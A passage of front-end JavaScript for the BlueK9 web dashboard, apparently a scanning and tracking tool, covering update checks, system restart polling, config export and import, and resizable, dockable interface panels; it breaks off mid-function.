                // Show recent changes if available
                // Note: API returns array of strings from git log --oneline (e.g. "abc1234 Fix something")
                if (data.recent_changes && data.recent_changes.length > 0) {
                    changesSection.classList.remove('hidden');
                    changesList.innerHTML = data.recent_changes.map(change => {
                        // Handle both object format {hash, message} and string format "hash message"
                        let hash, message;
                        if (typeof change === 'object' && change !== null) {
                            hash = change.hash || '';
                            message = change.message || '';
                        } else if (typeof change === 'string') {
                            const parts = change.split(' ', 1);
                            hash = parts[0] || '';
                            message = change.substring(hash.length + 1) || '';
                        } else {
                            hash = '';
                            message = String(change);
                        }
                        return `<div class="change-item">
                            <span class="change-hash">${hash}</span>
                            <span class="change-msg">${message}</span>
                        </div>`;
                    }).join('');
                }

                // Show apply button
                actions.classList.remove('hidden');
                addLogEntry(`Update available: ${data.commits_behind} commit(s) behind`, 'INFO');

            } else {
                // Up to date
                statusIcon.innerHTML = '&#10003;'; // Checkmark
                statusIcon.className = 'update-status-icon up-to-date';
                statusText.textContent = 'SYSTEM UP TO DATE';
                details.innerHTML = `
                    <div class="update-info-grid">
                        <div class="update-info-item">
                            <span class="update-label">COMMIT:</span>
                            <span class="update-value commit">${data.current_commit ? data.current_commit.substring(0, 8) : '--'}</span>
                        </div>
                        <div class="update-info-item">
                            <span class="update-label">BRANCH:</span>
                            <span class="update-value">${data.current_branch || 'main'}</span>
                        </div>
                    </div>
                `;
                addLogEntry('System is up to date', 'INFO');
            }
        })
        .catch(e => {
            checkBtn.disabled = false;
            statusIcon.innerHTML = '&#9888;';
            statusIcon.className = 'update-status-icon error';
            statusText.textContent = 'CONNECTION ERROR';
            details.innerHTML = `<div class="update-error">${e.message || 'Failed to check for updates'}</div>`;
            addLogEntry(`Update check error: ${e}`, 'ERROR');
        });
}

function applyUpdates() {
    const statusIcon = document.getElementById('updateStatusIcon');
    const statusText = document.getElementById('updateStatusText');
    const details = document.getElementById('updateDetails');
    const actions = document.getElementById('updateActions');
    const applyBtn = document.getElementById('btnApplyUpdate');

    statusIcon.innerHTML = '&#8635;'; // Refresh/spinning
    statusIcon.className = 'update-status-icon applying';
    statusText.textContent = 'APPLYING UPDATE...';
    details.innerHTML = '<div class="update-progress applying"><div class="update-progress-bar"></div></div>';
    actions.classList.add('hidden');
    applyBtn.disabled = true;

    addLogEntry('Applying system update...', 'INFO');

    fetch('/api/updates/apply', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                statusIcon.innerHTML = '&#10003;';
                statusIcon.className = 'update-status-icon up-to-date';
                statusText.textContent = 'UPDATE COMPLETE';

                let changesHtml = '';
                if (data.changes && data.changes.length > 0) {
                    changesHtml = data.changes.map(c => `<div class="change-item applied">${c}</div>`).join('');
                }

                // Check if auto-restart is happening
                if (data.auto_restart) {
                    details.innerHTML = `
                        <div class="update-success">
                            <div class="success-message">Update applied successfully!</div>
                            <div class="update-info-item">
                                <span class="update-label">NEW COMMIT:</span>
                                <span class="update-value commit new">${data.new_commit ? data.new_commit.substring(0, 8) : '--'}</span>
                            </div>
                            ${data.current_branch ? `<div class="update-info-item"><span class="update-label">BRANCH:</span><span class="update-value">${data.current_branch}</span></div>` : ''}
                            ${changesHtml ? '<div class="applied-changes">' + changesHtml + '</div>' : ''}
                        </div>
                        <div class="restart-notice auto-restart">
                            <p>System is restarting automatically...</p>
                            <div class="restart-spinner"></div>
                        </div>
                    `;
                    addLogEntry(`Update applied successfully: ${data.new_commit?.substring(0, 8)} - Auto-restarting...`, 'INFO');

                    // Show the update-specific overlay and start polling
                    showRestartOverlay('update');
                    updateRestartPhase('apply');
                    updateRestartProgress(30);
                    updateRestartStatus('Update applied, restarting services...');

                    // After a moment, switch to restart phase
                    setTimeout(() => {
                        updateRestartPhase('restart');
                        updateRestartProgress(60);
                        updateRestartStatus('Waiting for server to restart...');
                        pollForServerRestart();
                    }, 2000);
                } else {
                    details.innerHTML = `
                        <div class="update-success">
                            <div class="success-message">Update applied successfully!</div>
                            <div class="update-info-item">
                                <span class="update-label">NEW COMMIT:</span>
                                <span class="update-value commit new">${data.new_commit ? data.new_commit.substring(0, 8) : '--'}</span>
                            </div>
                            ${changesHtml ? '<div class="applied-changes">' + changesHtml + '</div>' : ''}
                        </div>
                        <div class="restart-notice">
                            <p>Restart required to apply changes.</p>
                            <button class="btn btn-warning" onclick="restartSystem()">
                                <span class="btn-icon">&#8634;</span> RESTART NOW
                            </button>
                        </div>
                    `;
                    addLogEntry(`Update applied successfully: ${data.new_commit?.substring(0, 8)}`, 'INFO');
                }

            } else {
                statusIcon.innerHTML = '&#9888;';
                statusIcon.className = 'update-status-icon error';
                statusText.textContent = 'UPDATE FAILED';
                details.innerHTML = `<div class="update-error">${data.error || 'Unknown error during update'}</div>`;
                actions.classList.remove('hidden');
                applyBtn.disabled = false;
                addLogEntry(`Update failed: ${data.error}`, 'ERROR');
            }
        })
        .catch(e => {
            statusIcon.innerHTML = '&#9888;';
            statusIcon.className = 'update-status-icon error';
            statusText.textContent = 'UPDATE ERROR';
            details.innerHTML = `<div class="update-error">${e.message || 'Failed to apply update'}</div>`;
            actions.classList.remove('hidden');
            applyBtn.disabled = false;
            addLogEntry(`Update error: ${e}`, 'ERROR');
        });
}

function loadSystemInfo() {
    fetch('/api/version')
        .then(r => r.json())
        .then(data => {
            if (data.version) {
                document.getElementById('sysInfoVersion').textContent = data.version;
            }
            // API returns 'commit' not 'git_commit'
            if (data.commit) {
                document.getElementById('sysInfoCommit').textContent = data.commit.substring(0, 8);
            }
            // API returns 'branch' not 'git_branch'
            if (data.branch) {
                document.getElementById('sysInfoBranch').textContent = data.branch;
            }
            if (data.last_updated) {
                document.getElementById('sysInfoLastUpdate').textContent = data.last_updated;
            }
        })
        .catch(e => console.log('Failed to load system info:', e));
}

function restartSystem() {
    if (!confirm('Are you sure you want to restart the BlueK9 system? All active scans will be stopped.')) {
        return;
    }

    addLogEntry('Initiating system restart...', 'INFO');

    // Show restart overlay
    showRestartOverlay();

    fetch('/api/system/restart', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'restarting') {
                updateRestartStatus('Stopping services...');
                // Start polling for server to come back
                setTimeout(() => {
                    updateRestartStatus('Waiting for server...');
                    pollForServerRestart();
                }, 3000);
            } else {
                hideRestartOverlay();
                addLogEntry(data.error || 'Failed to restart system', 'ERROR');
            }
        })
        .catch(e => {
            // Expected - server went down during restart
            updateRestartStatus('Server stopped, waiting for restart...');
            setTimeout(() => pollForServerRestart(), 2000);
        });
}

function showRestartOverlay(mode = 'restart') {
    const overlay = document.getElementById('restartOverlay');
    const title = document.getElementById('restartTitle');
    const subtext = document.getElementById('restartSubtext');
    const phaseList = document.getElementById('restartPhaseList');
    const countdown = document.getElementById('restartCountdown');

    // Reset poll counter for new restart attempt
    restartPollAttempts = 0;

    // Capture current session ID to detect when server actually restarts
    fetch('/api/version', { cache: 'no-store' })
        .then(r => r.json())
        .then(data => {
            preRestartSessionId = data.session_id;
            console.log('Captured pre-restart session ID:', preRestartSessionId);
        })
        .catch(() => {
            preRestartSessionId = null;
        });

    if (overlay) {
        overlay.classList.remove('hidden');
    }

    // Configure based on mode
    if (mode === 'update') {
        if (title) title.textContent = 'APPLYING UPDATE';
        if (subtext) subtext.textContent = 'BlueK9 is updating and will restart automatically...';
        if (phaseList) {
            phaseList.innerHTML = `
                <div class="restart-phase active" id="phase-download">
                    <span class="phase-icon">&#9679;</span>
                    <span class="phase-text">Downloading updates...</span>
                </div>
                <div class="restart-phase" id="phase-apply">
                    <span class="phase-icon">&#9675;</span>
                    <span class="phase-text">Applying changes...</span>
                </div>
                <div class="restart-phase" id="phase-restart">
                    <span class="phase-icon">&#9675;</span>
                    <span class="phase-text">Restarting services...</span>
                </div>
                <div class="restart-phase" id="phase-ready">
                    <span class="phase-icon">&#9675;</span>
                    <span class="phase-text">System ready</span>
                </div>
            `;
        }
    } else {
        if (title) title.textContent = 'SYSTEM RESTARTING';
        if (subtext) subtext.textContent = 'Please wait while BlueK9 reinitializes...';
        if (phaseList) {
            phaseList.innerHTML = `
                <div class="restart-phase active" id="phase-stop">
                    <span class="phase-icon">&#9679;</span>
                    <span class="phase-text">Stopping services...</span>
                </div>
                <div class="restart-phase" id="phase-restart">
                    <span class="phase-icon">&#9675;</span>
                    <span class="phase-text">Restarting...</span>
                </div>
                <div class="restart-phase" id="phase-ready">
                    <span class="phase-icon">&#9675;</span>
                    <span class="phase-text">System ready</span>
                </div>
            `;
        }
    }

    if (countdown) {
        countdown.classList.add('hidden');
    }
}

function hideRestartOverlay() {
    const overlay = document.getElementById('restartOverlay');
    if (overlay) {
        overlay.classList.add('hidden');
    }
}

function updateRestartStatus(status) {
    const statusEl = document.getElementById('restartStatus');
    if (statusEl) {
        statusEl.textContent = status;
    }
}

function updateRestartPhase(phaseId) {
    // Complete previous phases and activate current
    const phases = document.querySelectorAll('.restart-phase');
    let foundCurrent = false;

    phases.forEach(phase => {
        if (phase.id === `phase-${phaseId}`) {
            phase.classList.add('active');
            phase.querySelector('.phase-icon').innerHTML = '&#9679;';
            foundCurrent = true;
        } else if (!foundCurrent) {
            phase.classList.remove('active');
            phase.classList.add('completed');
            phase.querySelector('.phase-icon').innerHTML = '&#10003;';
        }
    });
}

function updateRestartProgress(percent) {
    const progressBar = document.getElementById('restartProgressBar');
    if (progressBar) {
        progressBar.style.width = `${percent}%`;
    }
}

let restartPollAttempts = 0;
let preRestartSessionId = null;
const MAX_RESTART_POLL_ATTEMPTS = 60; // 60 seconds max

function pollForServerRestart() {
    restartPollAttempts++;

    if (restartPollAttempts > MAX_RESTART_POLL_ATTEMPTS) {
        updateRestartStatus('Restart timeout - please refresh manually');
        return;
    }

    updateRestartStatus(`Reconnecting... (${restartPollAttempts}s)`);

    fetch('/api/version', {
        method: 'GET',
        cache: 'no-store'
    })
        .then(r => {
            if (r.ok) {
                return r.json();
            }
            throw new Error('Server not ready');
        })
        .then(data => {
            // Check if this is a NEW session (server actually restarted)
            if (preRestartSessionId && data.session_id === preRestartSessionId) {
                // Same session - server hasn't restarted yet
                updateRestartStatus(`Waiting for restart... (${restartPollAttempts}s)`);
                setTimeout(pollForServerRestart, 1000);
            } else {
                // Different session or no pre-restart ID - server has restarted
                updateRestartStatus('Server online! Redirecting to login...');
                startLoginCountdown(5);
            }
        })
        .catch(e => {
            // Server not ready yet - this is expected during restart
            setTimeout(pollForServerRestart, 1000);
        });
}

/**
 * Start countdown before redirecting to login
 */
function startLoginCountdown(seconds) {
    let remaining = seconds;
    const countdownEl = document.getElementById('restartCountdown');
    const countdownNumber = countdownEl?.querySelector('.countdown-number');

    // Show countdown element
    if (countdownEl) {
        countdownEl.classList.remove('hidden');
    }

    // Mark ready phase as complete
    updateRestartPhase('ready');
    updateRestartProgress(100);

    const countdownInterval = setInterval(() => {
        remaining--;

        if (countdownNumber) {
            countdownNumber.textContent = remaining;
        }
        updateRestartStatus(`Redirecting to login in ${remaining}...`);

        if (remaining <= 0) {
            clearInterval(countdownInterval);
            window.location.href = '/login';
        }
    }, 1000);

    // Initial display
    if (countdownNumber) {
        countdownNumber.textContent = remaining;
    }
    updateRestartStatus(`Redirecting to login in ${remaining}...`);
}

// ==================== CONFIG EXPORT/IMPORT ====================

function exportConfig() {
    fetch('/api/config/export')
        .then(r => r.json())
        .then(data => {
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `bluek9-config-${new Date().toISOString().slice(0,10)}.json`;
            a.click();
            URL.revokeObjectURL(url);
            addLogEntry('Configuration exported', 'INFO');
        })
        .catch(e => addLogEntry(`Export error: ${e}`, 'ERROR'));
}

function importConfig(event) {
    const file = event.target.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (e) => {
        try {
            const config = JSON.parse(e.target.result);
            fetch('/api/config/import', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(config)
            })
                .then(r => r.json())
                .then(data => {
                    if (data.status === 'imported') {
                        addLogEntry('Configuration imported successfully', 'INFO');
                        loadSettings();
                    } else {
                        addLogEntry(data.error || 'Import failed', 'ERROR');
                    }
                });
        } catch (err) {
            addLogEntry('Invalid configuration file', 'ERROR');
        }
    };
    reader.readAsText(file);
    event.target.value = '';
}

function resetLayout() {
    if (!confirm('Reset UI layout to default?')) return;

    const leftPanel = document.querySelector('.panel-left');
    const rightPanel = document.querySelector('.panel-right');
    const surveySection = document.getElementById('surveySection');
    const statsSection = document.getElementById('statsSection');
    const logsSection = document.getElementById('logsSection');

    leftPanel.style.width = '280px';
    rightPanel.style.width = '420px';

    // Reset vertical section heights to auto (flex)
    if (surveySection) {
        surveySection.style.height = '';
        surveySection.style.flex = '1';
    }
    if (statsSection) {
        statsSection.style.height = '';
        statsSection.style.flex = '0 0 auto';
    }
    if (logsSection) {
        logsSection.style.height = '';
        logsSection.style.flex = '1';
    }

    document.getElementById('settingLeftPanelWidth').value = 280;
    document.getElementById('settingRightPanelWidth').value = 420;

    // Clear localStorage layout
    localStorage.removeItem('bluek9_layout');

    addLogEntry('Layout reset to default', 'INFO');
}

// ==================== DRAGGABLE PANEL RESIZERS ====================

function saveLayoutToLocalStorage() {
    const leftPanel = document.querySelector('.panel-left');
    const rightPanel = document.querySelector('.panel-right');
    const surveySection = document.getElementById('surveySection');
    const statsSection = document.getElementById('statsSection');
    const logsSection = document.getElementById('logsSection');

    const layout = {
        leftPanelWidth: leftPanel ? leftPanel.offsetWidth : 280,
        rightPanelWidth: rightPanel ? rightPanel.offsetWidth : 420,
        surveySectionHeight: surveySection ? surveySection.offsetHeight : null,
        statsSectionHeight: statsSection ? statsSection.offsetHeight : null,
        logsSectionHeight: logsSection ? logsSection.offsetHeight : null,
        savedAt: new Date().toISOString()
    };

    localStorage.setItem('bluek9_layout', JSON.stringify(layout));

    // Also update settings inputs if they exist
    const leftInput = document.getElementById('settingLeftPanelWidth');
    const rightInput = document.getElementById('settingRightPanelWidth');
    if (leftInput) leftInput.value = layout.leftPanelWidth;
    if (rightInput) rightInput.value = layout.rightPanelWidth;
}

function loadLayoutFromLocalStorage() {
    const saved = localStorage.getItem('bluek9_layout');
    if (!saved) return;

    try {
        const layout = JSON.parse(saved);
        const leftPanel = document.querySelector('.panel-left');
        const rightPanel = document.querySelector('.panel-right');
        const surveySection = document.getElementById('surveySection');
        const statsSection = document.getElementById('statsSection');
        const logsSection = document.getElementById('logsSection');

        if (leftPanel && layout.leftPanelWidth) {
            leftPanel.style.width = layout.leftPanelWidth + 'px';
        }
        if (rightPanel && layout.rightPanelWidth) {
            rightPanel.style.width = layout.rightPanelWidth + 'px';
        }

        // Restore vertical section heights
        if (surveySection && layout.surveySectionHeight) {
            surveySection.style.height = layout.surveySectionHeight + 'px';
            surveySection.style.flex = 'none';
        }
        if (statsSection && layout.statsSectionHeight) {
            statsSection.style.height = layout.statsSectionHeight + 'px';
            statsSection.style.flex = 'none';
        }
        if (logsSection && layout.logsSectionHeight) {
            logsSection.style.height = layout.logsSectionHeight + 'px';
            logsSection.style.flex = 'none';
        }

        addLogEntry('Layout loaded from local storage', 'INFO');
    } catch (e) {
        console.error('Failed to load layout:', e);
    }
}

function initPanelResizers() {
    const leftPanel = document.querySelector('.panel-left');
    const rightPanel = document.querySelector('.panel-right');
    const leftHandle = document.getElementById('resizeHandleLeft');
    const rightHandle = document.getElementById('resizeHandleRight');

    console.log('initPanelResizers called');
    console.log('leftHandle:', leftHandle);
    console.log('rightHandle:', rightHandle);
    console.log('leftPanel:', leftPanel);
    console.log('rightPanel:', rightPanel);

    if (!leftHandle || !rightHandle) {
        console.error('Panel resize handles not found!');
        return;
    }

    let isResizing = false;
    let currentHandle = null;
    let startX = 0;
    let startWidth = 0;

    // Left handle - resizes left panel
    leftHandle.addEventListener('mousedown', (e) => {
        console.log('Left resize handle mousedown');
        isResizing = true;
        currentHandle = 'left';
        startX = e.clientX;
        startWidth = leftPanel.offsetWidth;
        leftHandle.classList.add('dragging');
        document.body.classList.add('resizing');
        e.preventDefault();
        e.stopPropagation();
    });

    // Right handle - resizes right panel
    rightHandle.addEventListener('mousedown', (e) => {
        console.log('Right resize handle mousedown');
        isResizing = true;
        currentHandle = 'right';
        startX = e.clientX;
        startWidth = rightPanel.offsetWidth;
        rightHandle.classList.add('dragging');
        document.body.classList.add('resizing');
        e.preventDefault();
        e.stopPropagation();
    });

    console.log('Panel resize handlers attached successfully');

    document.addEventListener('mousemove', (e) => {
        if (!isResizing) return;

        const diff = e.clientX - startX;

        if (currentHandle === 'left') {
            const newWidth = Math.max(200, Math.min(500, startWidth + diff));
            leftPanel.style.width = newWidth + 'px';
        } else if (currentHandle === 'right') {
            // Right panel: dragging left = bigger, dragging right = smaller
            const newWidth = Math.max(300, Math.min(700, startWidth - diff));
            rightPanel.style.width = newWidth + 'px';
        }

        // Trigger map resize
        if (window.map) {
            window.map.resize();
        }
    });

    document.addEventListener('mouseup', () => {
        if (isResizing) {
            isResizing = false;
            leftHandle.classList.remove('dragging');
            rightHandle.classList.remove('dragging');
            document.body.classList.remove('resizing');

            // Save layout
            saveLayoutToLocalStorage();

            // Also save to server for cross-device sync
            const config = {
                left_panel_width: leftPanel.offsetWidth,
                right_panel_width: rightPanel.offsetWidth
            };
            fetch('/api/config/layout', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(config)
            }).catch(() => {});
        }
    });

    // Load saved layout
    loadLayoutFromLocalStorage();
}

// Initialize vertical resizers for right panel sections
function initVerticalResizers() {
    const surveySection = document.getElementById('surveySection');
    const statsSection = document.getElementById('statsSection');
    const logsSection = document.getElementById('logsSection');
    const handle1 = document.getElementById('resizeHandleSurveyStats');
    const handle2 = document.getElementById('resizeHandleStatsLogs');

    if (!handle1 || !handle2) return;

    let isResizing = false;
    let currentHandle = null;
    let startY = 0;
    let startHeight1 = 0;
    let startHeight2 = 0;

    // Handle 1: Between Survey and Stats
    handle1.addEventListener('mousedown', (e) => {
        isResizing = true;
        currentHandle = 'survey-stats';
        startY = e.clientY;
        startHeight1 = surveySection.offsetHeight;
        startHeight2 = statsSection.offsetHeight;
        handle1.classList.add('dragging');
        document.body.classList.add('resizing-vertical');
        e.preventDefault();
    });

    // Handle 2: Between Stats and Logs
    handle2.addEventListener('mousedown', (e) => {
        isResizing = true;
        currentHandle = 'stats-logs';
        startY = e.clientY;
        startHeight1 = statsSection.offsetHeight;
        startHeight2 = logsSection.offsetHeight;
        handle2.classList.add('dragging');
        document.body.classList.add('resizing-vertical');
        e.preventDefault();
    });

    document.addEventListener('mousemove', (e) => {
        if (!isResizing) return;

        const diff = e.clientY - startY;
        const minHeight = 80;

        if (currentHandle === 'survey-stats') {
            const newHeight1 = Math.max(minHeight, startHeight1 + diff);
            const newHeight2 = Math.max(minHeight, startHeight2 - diff);

            // Only apply if both heights are valid
            if (newHeight1 >= minHeight && newHeight2 >= minHeight) {
                surveySection.style.height = newHeight1 + 'px';
                surveySection.style.flex = 'none';
                statsSection.style.height = newHeight2 + 'px';
                statsSection.style.flex = 'none';
            }
        } else if (currentHandle === 'stats-logs') {
            // Dragging down (positive diff) expands logs (below), shrinks stats (above)
            const newStatsHeight = Math.max(minHeight, startHeight1 - diff);

            // Only set explicit height on stats section
            // Logs section uses flex: 1 to fill remaining space (bottom-locked)
            if (newStatsHeight >= minHeight) {
                statsSection.style.height = newStatsHeight + 'px';
                statsSection.style.flex = 'none';
                // Let logs fill remaining space - removes bottom float issue
                logsSection.style.height = 'auto';
                logsSection.style.flex = '1';
            }
        }
    });

    document.addEventListener('mouseup', () => {
        if (isResizing) {
            isResizing = false;
            handle1.classList.remove('dragging');
            handle2.classList.remove('dragging');
            document.body.classList.remove('resizing-vertical');

            // Save layout
            saveLayoutToLocalStorage();
        }
    });
}

// Call after DOM ready
document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
        initPanelResizers();
        initVerticalResizers();
        loadPanelLayout();
        restoreSectionStates();
        refreshTargetList();
    }, 500);
});

// ==================== DOCKABLE PANELS ====================

let panelDragState = null;
let panelLayout = {
    leftPanel: 'left',
    rightPanel: 'right',
    leftCollapsed: false,
    rightCollapsed: false,
    rightDock: 'right' // 'right' or 'bottom'
};

/**
 * Start dragging a panel
 */
function startPanelDrag(event, panelId) {
    // Only start drag on left mouse button
    if (event.button !== 0) return;

    const panel = document.getElementById(panelId);
    if (!panel) return;

    // Prevent text selection during drag
    event.preventDefault();

    panelDragState = {
        panelId: panelId,
        panel: panel,
        startX: event.clientX,
        startY: event.clientY,
        isDragging: false
    };

    document.addEventListener('mousemove', handlePanelDrag);
    document.addEventListener('mouseup', endPanelDrag);
}

/**
 * Handle panel drag movement
 */
function handlePanelDrag(event) {
    if (!panelDragState) return;

    const dx = Math.abs(event.clientX - panelDragState.startX);
    const dy = Math.abs(event.clientY - panelDragState.startY);

    // Start actual drag after moving 10px
    if (!panelDragState.isDragging && (dx > 10 || dy > 10)) {
        panelDragState.isDragging = true;
        panelDragState.panel.classList.add('dragging');
        showDockZones();
    }

    if (panelDragState.isDragging) {
        highlightDockZone(event.clientX, event.clientY);
    }
}

/**
 * End panel drag
 */
function endPanelDrag(event) {
    if (!panelDragState) return;

    document.removeEventListener('mousemove', handlePanelDrag);
    document.removeEventListener('mouseup', endPanelDrag);

    if (panelDragState.isDragging) {
        panelDragState.panel.classList.remove('dragging');
        hideDockZones();

        // Check if we should dock to a new position
        const dockZone = getDockZoneAtPosition(event.clientX, event.clientY);
        if (dockZone) {
            dockPanelTo(panelDragState.panelId, dockZone);
        }
    }

    panelDragState = null;
}

/**
 * Show dock zone indicators
 */
function showDockZones() {
    let indicator = document.getElementById('dockIndicator');
    if (!indicator) {
        indicator = document.createElement('div');
        indicator.id = 'dockIndicator';
        indicator.className = 'dock-indicator';
        indicator.innerHTML = `
            <div class="dock-highlight dock-left" data-zone="left"></div>
            <div class="dock-highlight dock-right" data-zone="right"></div>
        `;
        document.body.appendChild(indicator);
    }
    indicator.classList.add('active');

    const mainContent = document.querySelector('.main-content');
    if (mainContent) {
        const rect = mainContent.getBoundingClientRect();
        const leftHighlight = indicator.querySelector('.dock-left');
        const rightHighlight = indicator.querySelector('.dock-right');

        leftHighlight.style.cssText = `
            left: ${rect.left}px;
            top: ${rect.top}px;
            width: 100px;
            height: ${rect.height}px;
            opacity: 0;
        `;
        rightHighlight.style.cssText = `
            left: ${rect.right - 100}px;
            top: ${rect.top}px;
            width: 100px;
            height: ${rect.height}px;
            opacity: 0;
        `;
    }
}

/**
 * Hide dock zone indicators
 */
function hideDockZones() {
    const indicator = document.getElementById('dockIndicator');
    if (indicator) {
        indicator.classList.remove('active');
    }
}

/**
 * Highlight the dock zone at cursor position
 */
function highlightDockZone(x, y) {
    const indicator = document.getElementById('dockIndicator');
    if (!indicator) return;

    const leftHighlight = indicator.querySelector('.dock-left');
    const rightHighlight = indicator.querySelector('.dock-right');

    const mainContent = document.querySelector('.main-content');
    if (!mainContent) return;

    const rect = mainContent.getBoundingClientRect();

    if (x < rect.left + 150) {
        leftHighlight.style.opacity = '1';
        rightHighlight.style.opacity = '0';
    } else if (x > rect.right - 150) {
        leftHighlight.style.opacity = '0';
        rightHighlight.style.opacity = '1';
    } else {
        leftHighlight.style.opacity = '0';
        rightHighlight.style.opacity = '0';
    }
}

/**
 * Get dock zone at cursor position
 */
function getDockZoneAtPosition(x, y) {
    const mainContent = document.querySelector('.main-content');
    if (!mainContent) return null;

    const rect = mainContent.getBoundingClientRect();

    if (x < rect.left + 150) return 'left';
    if (x > rect.right - 150) return 'right';
    return null;
}

/**
 * Dock a panel to a new position
 */
function dockPanelTo(panelId, position) {
    const panel = document.getElementById(panelId);
    if (!panel) return;

    const leftPanel = document.getElementById('panelLeft');
    const rightPanel = document.getElementById('panelRight');

    const panelIsLeft = panel === leftPanel;
    const targetIsLeft = position === 'left';

    if ((panelIsLeft && !targetIsLeft) || (!panelIsLeft && targetIsLeft)) {
        swapPanels();
    }

    savePanelLayout();
}

/**
 * Swap left and right panels
 */
function swapPanels() {
    const leftPanel = document.getElementById('panelLeft');
    const rightPanel = document.getElementById('panelRight');
    const mainContent = document.querySelector('.main-content');
    const leftHandle = document.getElementById('resizeHandleLeft');
    const rightHandle = document.getElementById('resizeHandleRight');

    if (!leftPanel || !rightPanel || !mainContent) return;

    // Toggle classes
    leftPanel.classList.toggle('panel-left');
    leftPanel.classList.toggle('panel-right');
    rightPanel.classList.toggle('panel-left');
    rightPanel.classList.toggle('panel-right');

    // Swap widths
    const leftWidth = leftPanel.style.width;
    const rightWidth = rightPanel.style.width;
    leftPanel.style.width = rightWidth || '420px';
    rightPanel.style.width = leftWidth || '280px';

    // Reorder elements in DOM
    if (leftPanel.classList.contains('panel-right')) {
        mainContent.insertBefore(rightPanel, leftHandle);
        mainContent.appendChild(leftPanel);
    } else {
        mainContent.insertBefore(leftPanel, leftHandle);
        mainContent.appendChild(rightPanel);
    }

    // Update layout state
    panelLayout.leftPanel = leftPanel.classList.contains('panel-left') ? 'left' : 'right';
    panelLayout.rightPanel = rightPanel.classList.contains('panel-left') ? 'left' : 'right';

    savePanelLayout();
    addLogEntry('Panel layout swapped', 'INFO');
}

/**
 * Toggle panel collapse state
 */
function togglePanelCollapse(panelId) {
    const panel = document.getElementById(panelId);
    if (!panel) return;

    panel.classList.toggle('collapsed');

    const btn = panel.querySelector('.collapse-btn');
    if (btn) {
        btn.innerHTML = panel.classList.contains('collapsed') ? '+' : '&#8722;';
    }

    if (panelId === 'panelLeft') {
        panelLayout.leftCollapsed = panel.classList.contains('collapsed');
    } else if (panelId === 'panelRight') {
        panelLayout.rightCollapsed = panel.classList.contains('collapsed');
    }

    savePanelLayout();
}

/**
 * Toggle section collapse state
 */
function toggleSection(sectionId) {
    const section = document.getElementById(sectionId);
    if (!section) return;

    section.classList.toggle('collapsed');

    // Save section collapse states to localStorage
    saveSectionStates();

    // Trigger resize recalculation for right panel sections
    if (sectionId === 'surveySection' || sectionId === 'statsSection' || sectionId === 'logsSection') {
        recalculateRightPanelSections();
    }
}

/**
 * Save section collapse states to localStorage
 */
function saveSectionStates() {
    const sections = ['sectionScan', 'sectionMap', 'sectionTracking', 'sectionTargets', 'surveySection', 'statsSection', 'logsSection'];
    const states = {};
    sections.forEach(id => {
        const section = document.getElementById(id);
        if (section) {
            states[id] = section.classList.contains('collapsed');
        }
    });
    localStorage.setItem('bluek9_section_states', JSON.stringify(states));
}

/**
 * Restore section collapse states from localStorage
 */
function restoreSectionStates() {
    const savedStates = localStorage.getItem('bluek9_section_states');
    if (!savedStates) return;

    try {
        const states = JSON.parse(savedStates);
        Object.keys(states).forEach(id => {
            const section = document.getElementById(id);
            if (section && states[id]) {
                section.classList.add('collapsed');
            }
        });
    } catch (e) {
        console.warn('Failed to restore section states:', e);
    }
}

/**
 * Recalculate right panel section heights after collapse toggle
 */
function recalculateRightPanelSections() {
    const surveySection = document.getElementById('surveySection');
    const statsSection = document.getElementById('statsSection');
    const logsSection = document.getElementById('logsSection');

    if (!surveySection || !statsSection || !logsSection) return;

    // Count non-collapsed sections
    const sections = [surveySection, statsSection, logsSection];
    const expandedSections = sections.filter(s => !s.classList.contains('collapsed'));

    if (expandedSections.length === 0) return;

    // Distribute height equally among expanded sections
    const panelRight = document.getElementById('panelRight');
    if (!panelRight) return;

    const headerHeight = panelRight.querySelector('.panel-header')?.offsetHeight || 0;
    const availableHeight = panelRight.offsetHeight - headerHeight;

    // Calculate collapsed section heights
    let collapsedHeight = 0;
    sections.forEach(s => {
        if (s.classList.contains('collapsed')) {
            collapsedHeight += s.querySelector('.section-header')?.offsetHeight || 35;
        }
    });

    // Subtract resize handles
    const handleHeight = 8 * 2; // Two resize handles
    const expandedAvailable = availableHeight - collapsedHeight - handleHeight;
    const heightPerSection = Math.floor(expandedAvailable / expandedSections.length);

    expandedSections.forEach(s => {
        s.style.height = `${heightPerSection}px`;
        s.style.flex = `0 0 ${heightPerSection}px`;
    });
}

/**
 * Save panel layout to local storage
 */
function savePanelLayout() {
    localStorage.setItem('bluek9_panel_layout', JSON.stringify(panelLayout));
}

/**
 * Toggle right panel between right side and bottom dock
 */
function toggleBottomDock() {
    const rightPanel = document.getElementById('panelRight');
    const mainContent = document.querySelector('.main-content');
    const resizeHandle = document.getElementById('resizeHandleRight');

    if (!rightPanel || !mainContent) return;

    if (panelLayout.rightDock === 'right') {
        // Move to bottom
        panelLayout.rightDock = 'bottom';
        rightPanel.classList.add('docked-bottom');
        rightPanel.classList.remove('panel-right');
        if (resizeHandle) resizeHandle.classList.add('hidden');

        // Move panel to after main-content
        const appContainer = document.querySelector('.app-container');
        if (appContainer) {
            appContainer.appendChild(rightPanel);
        }

        // Reset width and set height
        rightPanel.style.width = '100%';
        rightPanel.style.height = '300px';

        addLogEntry('Survey panel docked to bottom', 'INFO');
    } else {
        // Move to right
        panelLayout.rightDock = 'right';
        rightPanel.classList.remove('docked-bottom');
        rightPanel.classList.add('panel-right');
        if (resizeHandle) resizeHandle.classList.remove('hidden');

        // Move panel back into main-content
        mainContent.appendChild(rightPanel);

        // Reset height and set width
        rightPanel.style.width = '420px';
        rightPanel.style.height = '';

        addLogEntry('Survey panel docked to right', 'INFO');
    }

    // Update button icon
    const dockBtn = rightPanel.querySelector('.dock-bottom-btn');
    if (dockBtn) {
        dockBtn.innerHTML = panelLayout.rightDock === 'right' ? '&#8615;' : '&#8614;';
        dockBtn.title = panelLayout.rightDock === 'right' ? 'Dock to Bottom' : 'Dock to Right';
    }

    // Resize map
    if (window.map) {
